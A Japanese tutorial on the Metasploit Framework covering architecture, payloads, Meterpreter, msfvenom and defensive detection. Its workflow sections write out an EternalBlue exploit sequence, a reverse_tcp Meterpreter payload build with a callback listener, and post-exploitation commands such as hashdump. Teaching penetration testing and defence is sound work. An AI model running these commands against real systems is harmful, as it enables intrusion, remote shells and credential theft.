## 1. Metasploitとは

**Metasploit Framework** は、Rapid7 が中心となって開発・保守しているオープンソースの**ペネトレーションテスト（侵入テスト）フレームワーク**です。脆弱性の発見・検証・悪用（エクスプロイト）・事後活動（ポストエクスプロイト）までを、一貫した枠組みで扱えます。

- **開発言語**: 主に Ruby
- **ライセンス**: BSD系（コミュニティ版 Framework）
- **初版**: 2003年（H.D. Moore による）。2009年に Rapid7 が買収。
- **用途**:
  - セキュリティ検証（脆弱性が実際に悪用可能かの確認＝PoC）
  - レッドチーム演習
  - 脆弱性研究・エクスプロイト開発
  - 防御側の検知ルール（IDS/EDR/SIEM）の検証
  - セキュリティ教育・CTF

ポイントは「個別のエクスプロイトコードを寄せ集めたもの」ではなく、**エクスプロイト・ペイロード・エンコーダ・通信路・セッション管理を疎結合に組み合わせられる "枠組み"** であることです。これにより「ある脆弱性 × あるペイロード」を自由に差し替えられます。

## 2. 全体アーキテクチャ

Metasploitは階層化されたモジュール構造を取っています。

```
┌────────────────────────────────────────────────────────┐
│  インターフェース層                                      │
│   msfconsole / msfcli(廃止) / msfvenom / RPC API / Web  │
├────────────────────────────────────────────────────────┤
│  Framework コア (Ruby)                                   │
│   - モジュール管理 (Module Manager)                      │
│   - セッション管理 (Session Manager)                     │
│   - ジョブ/ハンドラ管理                                  │
│   - データストア (datastore: 設定値の保持)               │
├────────────────────────────────────────────────────────┤
│  ライブラリ層                                            │
│   - Rex   (Ruby Extension Library: 低レベル機能)         │
│   - Msf::Core / Msf::Base                                │
├────────────────────────────────────────────────────────┤
│  モジュール層                                            │
│   exploits / payloads / auxiliary / post /              │
│   encoders / nops / evasion                              │
├────────────────────────────────────────────────────────┤
│  データベース層 (PostgreSQL)                             │
│   ホスト・サービス・脆弱性・戦利品(loot)・認証情報を保存  │
└────────────────────────────────────────────────────────┘
```

### 主要ライブラリ
- **Rex (Ruby Extension)**: ソケット、プロトコル、SSL、テキスト変換、エンコードなど、最も低レベルな機能群。Frameworkから独立して使える設計。
- **Msf::Core**: モジュールの基底クラス、ミキシン(Mixin)、データストア、イベント処理など中核ロジック。
- **Msf::Base**: コアの上に乗る、簡略化されたAPIとシリアライズ等。

### モジュールの探索パス
- システム標準: `modules/` 配下
- ユーザー独自: `~/.msf4/modules/`（同じディレクトリ構造を作れば自作モジュールを読み込める）

## 3. 中心となる概念（モジュールの種類）

Metasploitの機能は**モジュール**という単位で提供されます。種類ごとに役割が明確に分かれています。

| モジュール種別 | 役割 | 例 |
|---|---|---|
| **exploit** | 脆弱性を突いて制御を奪う | `exploit/windows/smb/ms17_010_eternalblue` |
| **payload** | 侵入成功後に実行されるコード | `windows/x64/meterpreter/reverse_tcp` |
| **auxiliary** | 攻撃以外の補助（スキャン・ファジング・列挙・DoS・ブルートフォース等） | `auxiliary/scanner/portscan/tcp` |
| **post** | セッション取得後の事後活動 | `post/windows/gather/hashdump` |
| **encoder** | ペイロードを変形（NULLバイト回避、簡易な検知回避） | `x86/shikata_ga_nai` |
| **nop** | NOPスレッド生成（命令長調整） | `x86/single_byte` |
| **evasion** | アンチウイルス回避を目的とした生成 | `windows/windows_defender_exe` |

### exploit の2分類
- **Active（能動）**: こちらから対象へアクセスして即座に脆弱性を突く（例: SMBサービスへの攻撃）。
- **Passive（受動）**: こちらは待ち受け、対象（被害者）側からの接続を待つ（例: 悪性Webページを踏ませるブラウザ攻撃）。

### auxiliary は「攻撃しないモジュール」
ポートスキャン、サービスバージョン特定、SMB/FTP/SSHのログイン試行、SNMP列挙など。**実際の侵入テストでは、最初に最も多用するのが auxiliary** です。

## 4. Payload と Stager / Stage の仕組み

「Payload（ペイロード）」は脆弱性を突いた**後**にターゲット上で動くコードです。Metasploit理解の核心はここにあります。

### 4.1 Payloadの3タイプ

| タイプ | 説明 |
|---|---|
| **Single（Inline）** | 単体で完結。小さなタスクを1ショットで実行（例: `windows/shell_bind_tcp`）。サイズは大きめ。 |
| **Stager** | 小さな"先遣隊"。攻撃側と通信路を確立し、本体(Stage)を呼び込む。 |
| **Stage** | Stagerによってダウンロード・実行される本体（例: Meterpreter）。サイズ制限を気にせず高機能にできる。 |

### 4.2 Staged Payload の流れ

```
[攻撃側 Metasploit]                         [ターゲット]
      │                                          │
      │  ① exploitで脆弱性を突き、Stagerを送り込む │
      │ ───────────────────────────────────────▶ │
      │                                          │ Stager実行
      │  ② Stagerが攻撃側へ接続(reverse)          │
      │ ◀─────────────────────────────────────── │
      │  ③ Stage本体(Meterpreterなど)を転送       │
      │ ───────────────────────────────────────▶ │
      │                                          │ メモリ上で展開
      │  ④ 暗号化されたセッション確立             │
      │ ◀──────────────────────────────────────▶ │
```

### 4.3 命名規則の読み方

ペイロード名のスラッシュとアンダースコアで構造が分かります。

```
windows/x64/meterpreter/reverse_tcp
   │      │       │          │
  OS    アーキ  Stage本体   通信方式(Stager)
```

- `meterpreter/reverse_tcp` … **Staged**（スラッシュ区切り = Stager と Stage が分離）
- `shell_reverse_tcp` … **Single**（アンダースコア = 単体完結）

### 4.4 接続方向: reverse と bind

| 方式 | 動作 | 使いどころ |
|---|---|---|
| **reverse_tcp** | ターゲット → 攻撃側へ**こちらに接続させる** | ターゲットがNAT/ファイアウォール内。最も一般的。 |
| **bind_tcp** | ターゲット上でポートを**待ち受け**、攻撃側から接続 | ターゲットが直接到達可能なとき。 |

reverseが好まれるのは、多くのFWが**内→外（アウトバウンド）通信は緩い**ため。`reverse_https` のように443/HTTPSを使うと通信が一般的なWebトラフィックに紛れて検知されにくくなります（防御側はこの点を逆に監視ポイントにします）。

## 5. Meterpreter の仕組み

**Meterpreter（Meta-Interpreter）** は Metasploitを象徴する高機能ペイロードです。

### 特徴
1. **メモリ常駐（インメモリ DLL インジェクション）**
   ディスクにファイルを書かず、対象プロセスのメモリ上で展開される。フォレンジックやAVの検知を受けにくい（=防御側はメモリ／挙動ベースの検知が重要になる）。
2. **暗号化通信（TLS）**
   攻撃側との通信は暗号化され、内容が読まれにくい。
3. **プロセスインジェクション / マイグレーション**
   `migrate` コマンドで別プロセス（例: `explorer.exe`）に移動し、元プロセスが終了しても生存を維持。
4. **拡張可能**
   実行時に機能モジュール（extension）を動的にロードできる（`stdapi`, `priv`, `kiwi`(Mimikatz相当) など）。

### 代表的なコマンド（取得後のセッション内）
| コマンド | 機能 |
|---|---|
| `sysinfo` | OS・アーキ情報の表示 |
| `getuid` | 現在の権限ユーザー |
| `ps` / `migrate <PID>` | プロセス一覧 / プロセス移動 |
| `hashdump` | パスワードハッシュの取得（要権限） |
| `screenshot` | 画面キャプチャ |
| `download` / `upload` | ファイル転送 |
| `shell` | OSネイティブのシェルを起動 |
| `getsystem` | 権限昇格の試行 |
| `background` | セッションを背後へ（msfに戻る） |

> これらは「攻撃者が侵入後に何ができるか」を示します。防御側はこれらの**痕跡（不審なプロセス移動、メモリ上のDLL、暗号化アウトバウンド）**を検知対象として理解しておく価値があります。

## 6. 典型的なワークフロー

ペネトレーションテストの一般的な流れと、対応するMetasploit機能です。

```
① 偵察 (Recon)        →  auxiliary/scanner/*, db_nmap, Nmap連携
② 列挙 (Enumeration)  →  サービス/バージョン特定、認証情報の試行
③ 脆弱性特定          →  検出結果とexploit-DBの突き合わせ
④ エクスプロイト      →  use exploit/... ; set ... ; exploit
⑤ ポストエクスプロイト →  post/*, Meterpreterコマンド
⑥ 権限昇格 / 横展開    →  getsystem, pivoting, pass-the-hash
⑦ 後片付け・報告      →  痕跡の整理、レポート作成
```

### msfconsole の基本操作例（学習用の流れ）

```bash
msfconsole                       # 起動

search ms17-010                  # モジュール検索
use exploit/windows/smb/ms17_010_eternalblue
                                 # モジュール選択
info                             # モジュール情報の確認
show options                     # 必要な設定項目の表示

set RHOSTS 192.168.56.101        # ターゲット(リモートホスト)
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.1           # 攻撃側(ローカルホスト)
set LPORT 4444                   # 待ち受けポート

check                            # 脆弱かどうかの確認(対応モジュールのみ)
exploit                          # 実行 (= run)

# 成功するとMeterpreterセッションが開く
meterpreter > sysinfo
meterpreter > background         # セッションを背後へ
sessions -l                      # セッション一覧
sessions -i 1                    # セッション1に戻る
```

### 主要な設定変数（datastore）
| 変数 | 意味 |
|---|---|
| `RHOSTS` / `RPORT` | ターゲット側のホスト / ポート |
| `LHOST` / `LPORT` | 攻撃側（待ち受け）のホスト / ポート |
| `PAYLOAD` | 使用ペイロード |
| `TARGET` | ターゲットの種類（OSビルド等のインデックス） |
| `SESSION` | postモジュールが対象にするセッション番号 |

`setg` を使うとグローバル（全モジュール共通）に設定でき、`LHOST` のような繰り返す値に便利です。

## 7. 主要コンポーネント・周辺ツール

| ツール | 役割 |
|---|---|
| **msfconsole** | 中心的なCUI。全機能にアクセスできる対話インターフェース。 |
| **msfvenom** | ペイロード生成＋エンコードのスタンドアロンツール（旧 msfpayload + msfencode 統合）。`.exe`/`.elf`/`.apk`/シェルコード等を出力。 |
| **msfdb** | データベース初期化・管理ユーティリティ。 |
| **meterpreter** | 前述の高機能ペイロード／対話シェル。 |
| **Metasploit RPC (msgrpc)** | 外部プログラムからMetasploitを操作するためのAPI。 |
| **Armitage** | Metasploitのサードパーティ製GUI（攻撃の可視化・チーム共有）。 |
| **resource script (.rc)** | 一連のコマンドを自動実行するスクリプト（`msfconsole -r script.rc`）。 |

### msfvenom の例（ペイロード生成の概念）

```bash
# Windows向け reverse_tcp の実行ファイルを生成する典型例
msfvenom -p windows/x64/meterpreter/reverse_tcp \
         LHOST=192.168.56.1 LPORT=4444 \
         -f exe -o payload.exe

# -p : payload, -f : 出力フォーマット, -e : encoder, -i : エンコード反復回数
# -a : アーキ, --platform : プラットフォーム, -b : 回避したいバイト("\x00"等)
```

> **エンコーダの誤解に注意**: `shikata_ga_nai` 等のエンコーダは本来 **不正なバイト（NULL等）の除去** が目的であり、現代のAV/EDRに対する確実な回避手段ではありません。シグネチャはとうに登録済みです。

### 待ち受け（handler）の単独起動
exploitを使わず、別経路で実行させたペイロードを受けるには汎用ハンドラを使います。

```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.1
set LPORT 4444
exploit -j     # -j でジョブ(バックグラウンド)として待ち受け
```

## 8. データベースと連携

Metasploitは **PostgreSQL** と連携し、テスト中に得た情報を構造化して保存できます。大規模な対象や長期の演習で威力を発揮します。

### 保存される主な情報
- **hosts**: 発見したホスト（IP・OS・状態）
- **services**: 開いているポート／サービス／バージョン
- **vulns**: 検出した脆弱性
- **creds**: 取得した認証情報（ユーザー名・ハッシュ・平文）
- **loot**: 収集した戦利品（設定ファイル、ハッシュダンプ等）
- **notes**: 補足メモ

### 代表的なDBコマンド
```bash
db_status                 # DB接続状態
workspace -a engagementA  # ワークスペース(案件)を分けて管理
db_nmap -sV 192.168.56.0/24   # Nmapを実行し結果を自動でDBへ取り込み
hosts                     # 取り込んだホスト一覧
services                  # サービス一覧
creds                     # 認証情報一覧
loot                      # 戦利品一覧
```

`db_nmap` のように、**Nmap** をMetasploit内から呼び出して結果を自動でDBへ格納できる点が、偵察→攻撃の流れをスムーズにします。

## 9. エディションの違い

| エディション | 概要 |
|---|---|
| **Metasploit Framework** | 無償・オープンソース。CUI（msfconsole）中心。本書の対象。 |
| **Metasploit Pro** | Rapid7の商用版。Web GUI、タスクチェーン、ソーシャルエンジニアリング、自動エクスプロイト、レポート自動生成、チーム連携などを追加。 |

学習・研究・多くのペンテスト実務はFramework版で十分にカバーできます。Proは大規模・反復的な業務での効率化・レポーティングが主眼です。

## 10. 防御側（ブルーチーム）の視点

Metasploitの仕組みを学ぶ最大の実利の一つは、**防御の精度が上がる**ことです。攻撃の挙動を知れば、検知・緩和の勘所が分かります。

### 検知の着眼点
- **アウトバウンドの異常**: 内部ホストから外部への予期しない接続、特に `4444` 等の既定ポートや、業務時間外の暗号化通信。
- **プロセス挙動**: 正規プロセス（`explorer.exe` 等）への不審なコードインジェクション／スレッド生成（Meterpreterのmigrate）。
- **インメモリの兆候**: ディスク上に痕跡を残さないペイロード → メモリスキャン／EDRの挙動検知が重要。
- **既知シグネチャ**: 既定の `shikata_ga_nai` エンコードや未改変ペイロードはAV/IDSで検知されやすい。
- **認証情報の異常利用**: pass-the-hash、急な権限昇格、横展開（lateral movement）。

### 緩和策
- パッチ管理の徹底（多くのexploitは既知の未修正脆弱性を突く。例: MS17-010 は修正パッチ済み）。
- 最小権限の原則、ネットワークセグメンテーションで横展開を抑止。
- アウトバウンドのフィルタリングとegress監視。
- EDR/EDRのメモリ・挙動ベース検知、SIEMでの相関分析。
- 検証環境（やられサーバ: Metasploitable2/3 など）で**自分の検知ルールをMetasploitでテスト**する。

> 攻撃ツールの理解は、攻撃のためではなく **「自分たちの守りが実際の攻撃手法に耐えるか」を検証するため** に使うのが、もっとも価値のある使い方です。

## 11. 用語集

| 用語 | 意味 |
|---|---|
| **Exploit** | 脆弱性を悪用して意図しない動作（コード実行など）を引き起こすコード／手順。 |
| **Payload** | エクスプロイト成功後にターゲットで実行されるコード。 |
| **Stager / Stage** | 通信路を確立する先遣コード / それが呼び込む本体コード。 |
| **Meterpreter** | メモリ常駐・暗号化・拡張可能な高機能ペイロード。 |
| **Listener / Handler** | 攻撃側でペイロードからの接続を待ち受ける仕組み。 |
| **Session** | 取得した制御チャネル（Meterpreterやshell）。 |
| **datastore** | モジュールの設定値（RHOSTS等）を保持する領域。 |
| **Pivoting** | 侵入済みホストを踏み台に内部ネットワークへ到達すること。 |
| **Post-exploitation** | セッション取得後の情報収集・権限昇格・横展開など。 |
| **LHOST / RHOST** | 攻撃側（Local）/ ターゲット側（Remote）のホスト。 |
| **NOP sled** | 命令を読み飛ばさせるためのNOP命令列。 |
| **Encoder** | ペイロードのバイト列を変形（NULL除去等）するモジュール。 |
